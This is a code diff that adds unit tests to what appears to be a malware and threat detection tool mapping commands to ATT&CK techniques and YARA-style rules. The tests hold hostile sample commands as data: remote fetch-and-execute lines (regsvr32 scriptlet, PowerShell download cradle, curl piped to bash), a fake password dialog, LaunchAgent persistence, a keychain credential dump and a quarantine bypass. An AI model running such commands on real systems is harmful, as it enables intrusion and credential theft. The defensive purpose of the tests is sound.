@@ -24,6 +24,7 @@ from wrapper_archetypes import (
 )
 from chain_analyzer import analyze_chain
 from sigma_generator import emit_sigma, emit_sysmon
+from routers.ai import _is_already_plaintext
 
 
 # ── P0-3 · IOC URL extractor stops on shell metacharacters ─────────────
@@ -286,3 +287,145 @@ def test_composite_lolbas_msiexec_screenshot1():
     for expected in ("LOLBAS_Signed_Bin_Rename", "Msiexec_Remote_Silent_Install",
                      "Temp_Directory_Staging"):
         assert expected in rule_names, f"Missing YARA rule {expected}. Got: {rule_names}"
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# Feb 2026 v1.2.0 · Plaintext AI-DECODE short-circuit
+# ═══════════════════════════════════════════════════════════════════════
+def test_plaintext_detection_lolbas_rename():
+    text = r"cmd /c copy c:\windows\system32\curl.exe X.exe"
+    assert _is_already_plaintext(text) is True
+
+
+def test_plaintext_detection_installutil():
+    text = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /U evil.exe"
+    assert _is_already_plaintext(text) is True
+
+
+def test_plaintext_detection_regsvr32_squiblydoo():
+    text = "regsvr32.exe /s /n /u /i:https://malicious-domain.com/x.sct scrobj.dll"
+    assert _is_already_plaintext(text) is True
+
+
+def test_plaintext_detection_powershell_iex():
+    text = 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x/a.ps1\')"'
+    assert _is_already_plaintext(text) is True
+
+
+def test_plaintext_detection_osascript():
+    text = 'osascript -e "display dialog"'
+    assert _is_already_plaintext(text) is True
+
+
+def test_plaintext_detection_rejects_encoded_ps():
+    text = "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+    assert _is_already_plaintext(text) is False
+
+
+def test_plaintext_detection_rejects_raw_base64():
+    text = "SGVsbG8gd29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgYmxvYiB0aGF0IHNob3VsZCBub3QgYmUgcGxhaW50ZXh0"
+    assert _is_already_plaintext(text) is False
+
+
+def test_plaintext_detection_rejects_raw_hex_pe():
+    text = "4d5a90000300000004000000ffff0000b8000000000000004000000000000000000000000000000000"
+    assert _is_already_plaintext(text) is False
+
+
+def test_plaintext_detection_rejects_url_encoded():
+    text = "powershell.exe%20-nop%20-c%20%22IEX%20%28New-Object%29%22"
+    assert _is_already_plaintext(text) is False
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# Feb 2026 v1.2.0 · macOS tradecraft
+# ═══════════════════════════════════════════════════════════════════════
+def test_macos_osascript_dialog():
+    text = 'osascript -e \'display dialog "System Preferences requires your password" default answer ""\''
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1059.002" in mitre
+    assert "T1056.002" in mitre  # fake credential prompt
+    assert "macOS_osascript_dialog" in yara
+
+
+def test_macos_launchagent_persistence():
+    text = "cp ~/Downloads/evil.plist ~/Library/LaunchAgents/com.apple.softwareupdate.plist && launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1543.001" in mitre
+    assert "macOS_launchagent_persistence" in yara or "macOS_launchctl_load" in yara
+
+
+def test_macos_keychain_dump():
+    text = "security find-generic-password -a admin -s login.keychain -w"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1555.001" in mitre
+    assert "macOS_keychain_dump" in yara
+
+
+def test_macos_gatekeeper_bypass():
+    text = "xattr -d com.apple.quarantine /Users/admin/Downloads/AmosStealer.dmg"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1553.001" in mitre
+    assert "macOS_gatekeeper_bypass" in yara
+
+
+def test_macos_curl_pipe_sh():
+    text = 'curl -fsSL "https://amos-pkg.io/install.sh" | bash'
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1105" in mitre
+    assert "macOS_curl_pipe_shell" in yara or "Bash_Curl_Wget_Pipe_Shell" in yara
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# Feb 2026 v1.2.0 · Cloud & Identity abuse
+# ═══════════════════════════════════════════════════════════════════════
+def test_oauth_device_code_phishing():
+    text = "https://microsoft.com/devicelogin?otc=ABC123XYZ"
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "OAuth_DeviceCode_Phishing" in yara
+
+
+def test_teams_webhook_c2():
+    text = "POST https://mycorp.webhook.office.com/webhookb2/abc-123-def/IncomingWebhook/xyz"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1102" in mitre
+    assert "MS_Teams_Webhook_C2" in yara
+
+
+def test_ms_graph_api_exfil():
+    text = "GET https://graph.microsoft.com/v1.0/me/messages"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1567" in mitre
+    assert "MS_Graph_API_C2" in yara
+
+
+def test_aws_access_key_leak():
+    text = "aws_access_key_id = AKIAIOSFODNN7EXAMPLE"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1552.001" in mitre
+    assert "AWS_Access_Key_Leak" in yara
+
+
+def test_oauth_overscoped_consent():
+    text = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=abc123&scope=Mail.ReadWrite%20Files.ReadWrite.All%20offline_access"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1550.001" in mitre or "T1528" in mitre
+    assert "OAuth_Overscoped_Consent" in yara
+
+
+def test_aad_prt_abuse():
+    text = "aadinternals Get-AADIntUserPRTToken -Cookie x-ms-refreshtokencredential"
+    mitre = [m["id"] for m in mitre_map(text)]
+    yara = [y["rule"] for y in yara_lite_scan(text)]
+    assert "T1550.001" in mitre
+    assert "AAD_Primary_Refresh_Token" in yara
+
